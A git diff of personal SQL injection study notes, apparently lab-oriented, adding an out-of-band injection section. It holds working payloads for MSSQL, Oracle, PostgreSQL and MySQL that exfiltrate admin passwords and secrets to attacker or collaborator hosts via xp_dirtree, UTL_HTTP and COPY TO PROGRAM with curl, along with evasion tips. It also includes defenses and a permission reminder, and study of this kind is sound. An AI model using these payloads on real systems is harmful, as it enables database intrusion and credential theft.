@@ -94,6 +94,8 @@ CHEAT-SHEET-FOR ALL DB -> https://portswigger.net/web-security/sql-injection/che
 
 
 
+
+--------
 ## type of sqli
 
 	SQL Injection
@@ -133,11 +135,14 @@ CHEAT-SHEET-FOR ALL DB -> https://portswigger.net/web-security/sql-injection/che
 	    └── Error-message leakage in dev/debug mode
 	
 
-------
 
+
+--------------
 ## how to test
 
 
+ TESTING:
+ 
 	helping to know the types : https://portswigger.net/web-security/sql-
 	injection/cheat-sheet 
 	
@@ -174,7 +179,7 @@ CHEAT-SHEET-FOR ALL DB -> https://portswigger.net/web-security/sql-injection/che
 	   |         
 	   │
 	   ↓ No
-	   #Out-of-band 
+	   #Out-of-band (OAST)
 	OOB Payload 
 	   ├─ Response? Yes → Out-of-Band SQLi
 	   │        MySQL:  id=1 AND LOAD_FILE('\\\\attacker.com\\abc')
@@ -196,10 +201,9 @@ CHEAT-SHEET-FOR ALL DB -> https://portswigger.net/web-security/sql-injection/che
 	            e.g. UN/  ** /  ION SEL/ ** /ECT
 	            e.g. UNION%0aSELECT
 
-
-
 	
-	Beyond SQL Injection: Escalating Database Attack
+   Beyond SQL Injection: Escalating Database Attack
+	
 	│
 	├── Why escalation matters
 	│   ├── Applications use single DB account
@@ -230,12 +234,103 @@ CHEAT-SHEET-FOR ALL DB -> https://portswigger.net/web-security/sql-injection/che
 	└── MySQL
 	    ├── LOAD_FILE → read files
 	    ├── SELECT INTO OUTFILE → write files/backdoors
-	    └── UDFs → custom OS-level functions
-	
-	
+	    └── UDFs → custom OS-level functions	
+
+OOB SQLi (OAST)
+
+	├─ 1) Preconditions / Success conditions
+	│   ├─ A) Application / worker executes the query asynchronously (async)
+	│   ├─ B) Database provides features that cause network callbacks
+	│   │   ├─ MSSQL: xp_dirtree, xp_cmdshell, CLR procedures
+	│   │   ├─ Oracle: UTL_HTTP, DBMS_LDAP, UTL_TCP
+	│   │   ├─ PostgreSQL: dblink, COPY TO PROGRAM, extensions
+	│   │   └─ MySQL: LOAD_FILE / INTO OUTFILE to UNC share (limited)
+	│   └─ C) Target network allows egress for the protocol used (commonly DNS or HTTP)
+	│
+	├─ 2) Observable channels
+	│   ├─ DNS callbacks (most common)
+	│   ├─ HTTP(S) callbacks
+	│   ├─ SMB / NTLM (UNC path lookup / NTLM relay opportunities)
+	│   └─ Other protocols (LDAP, SMTP) — rare
+	│
+	├─ 3) Payload types
+	│   ├─ Simple lookup (static) → proves OOB capability
+	│   ├─ Conditional lookup (boolean) → infer a bit/char
+	│   ├─ Encoded chunking → exfiltrate data efficiently (base32/base64, 6-bit chunks)
+	│   └─ Command execution → direct outbound call if DB allows
+	│
+	├─ 4) Exploitation flow
+	│   ├─ a) Discover async behavior (202 responses, immediate reply, presence of queues)
+	│   ├─ b) Test capability: inject a benign payload to trigger a fixed DNS lookup
+	│   ├─ c) If success: design exfiltration strategy (chunk size, encoding, label splitting)
+	│   ├─ d) Iterate: extract data chunk-by-chunk via attacker-controlled subdomains
+	│   └─ e) Clean up / stealth: reduce rate, randomize labels, backoff
+	│
+	├─ 5) DB-specific examples
+	│   ├─ MSSQL
+	│   │   ├─ discovery: `'; EXEC master..xp_dirtree '\\\\x.y.collab.net\\a'--`
+	│   │   └─ conditional: `IF (SUBSTRING(pwd,1,1)='a') EXEC master..xp_dirtree '\\a.collab.net\\a'`
+	│   ├─ Oracle
+	│   │   └─ `UTL_HTTP.REQUEST('http://'||secret||'.collab.net/')` (requires privileges)
+	│   ├─ PostgreSQL
+	│   │   └─ `COPY (SELECT secret) TO PROGRAM 'curl http://attacker/$(cat -)'` (requires privileges)
+	│   └─ MySQL
+	│       └─ UNC share / file functions — usually limited in modern deployments
+	│
+	├─ 6) Detections & Defenses
+	│   ├─ Egress filtering (block DNS/HTTP egress or force proxy)
+	│   ├─ Network IDS / alerting on unusual DNS patterns
+	│   ├─ Least-privilege DB accounts (disable xp_*, UTL_HTTP, etc.)
+	│   ├─ WAF + input validation (useful but not sufficient)
+	│   └─ Monitor job queues / worker logs for suspicious input
+	│
+	├─ 7) Practical checklist for testers
+	│   ├─ 1) Identify async endpoints (queues, 202 Accepted, background workers)
+	│   ├─ 2) Verify collaborator DNS sees lookups for a static test
+	│   ├─ 3) Confirm DB supports network functions or worker environment can trigger network calls
+	│   ├─ 4) Choose chunk size & encoding (observe DNS label limits)
+	│   ├─ 5) Automate extraction loop with retry/backoff and rate limits
+	│   └─ 6) Respect legal/ethical boundaries — use lab or explicit permission
+	│
+	└─ 8) Quick tips & constraints
+	    ├─ DNS label max length = 63 bytes; total domain ≈ 253 bytes
+	    ├─ Use short labels and split payloads across labels
+	    ├─ Reduce detection: vary timing, lower request rate, randomize labels
+	    └─ If DNS blocked: try HTTP callbacks or local-worker compromise
 
 
 
+how out-of-band work
+    [ Client] ---> HTTP request (trackingId=PAYLOAD) ---> [Web server / web-thread]
+                          |
+                          |---> (Option A: synchronous) ---> [DB] ---> execute SQL immediately
+                          |           |                           |
+                          |           |<-- response / time-based ---|
+                          |
+                          |---> (Option B: async) ---> enqueue job ---> [Queue system]
+                                                              |
+                                                              v
+                                                       [Worker / background thread]
+                                                              |
+                                                              v
+                                                          [DB or Worker action]
+                                                              |
+                                           (triggers outbound network call — DNS/HTTP/SMB)
+                                                              |
+                                                              v
+                                                        [Attacker-controlled server]
+
+
+
+
+
+
+
+
+
+---------------
+
+-------------
 # TIPS of DB
 
 	Oracle ->
@@ -328,11 +423,37 @@ CHEAT-SHEET-FOR ALL DB -> https://portswigger.net/web-security/sql-injection/che
 	 Length: || (SELECT CASE WHEN ((SELECT CHAR_LENGTH(password) FROM users WHERE username='admin' LIMIT 1  = {n}) THEN pg_sleep({delay}) ELSE pg_sleep(0) END)--
 	 extracting content of passwd: || (SELECT CASE WHEN (ASCII(SUBSTRING((SELECT password FROM users WHERE username='admin' LIMIT 1 ), {pos}, 1)) = {ascii}) THEN pg_sleep({delay}) ELSE pg_sleep(0) END)--
 
+#how to detect out-of-band ()
+ free site to test DNS lookup ->  [http://dnslog.pw/],[https://webhook.site] 
+   A) MSSQL (UNC/DNS via xp_*):
+      Payload (discovery):
+      `'; EXEC master..xp_dirtree '\\\<UNIQUE>.<YOUR-COLLAB>\a'--`
+      Conditional example:
+      `'; IF (SUBSTRING((SELECT TOP 1 password FROM users),1,1)='a') EXEC master..xp_dirtree '\\a.<YOUR-COLLAB>\a'--`  
+
+	or you can extract the passwd like that -> '; DECLARE @p VARCHAR(1024);
+	  SET @p = (SELECT TOP 1 password FROM users WHERE username='Administrator');
+	  EXEC('master..xp_dirtree ''\\\\' + @p + '.<YOUR-COLLAB>.burpcollaborator.net\\a''')  -- 
+	  you can show the passwd at all 
+
+   B) Oracle (HTTP via UTL_HTTP):
+      Test (static):
+      `'|| UTL_HTTP.REQUEST('http://test.<YOUR-COLLAB>/') ||'`
+      Exfil (simple, needs privileges):
+      `'|| UTL_HTTP.REQUEST('http://' || (SELECT secret FROM secrets WHERE ROWNUM=1) || '.<YOUR-COLLAB>/') ||'`
+   C) PostgreSQL (COPY TO PROGRAM / dblink — often needs superuser/extensions):
+      Superuser test:
+      `'; COPY (SELECT 'x') TO PROGRAM 'curl http://<UNIQUE>.<YOUR-COLLAB>/' --`
+      dblink (if available):
+      `'; SELECT dblink_exec('host=<YOUR-COLLAB>','SELECT 1'); --`
+   D) MySQL (limited; try UNC/LOAD_FILE but often blocked):
+      `'; SELECT LOAD_FILE(CONCAT('\\\\','<UNIQUE>.<YOUR-COLLAB>','\\a')); --`
 
 
 
 
 
+--------------
 # labs
 
 
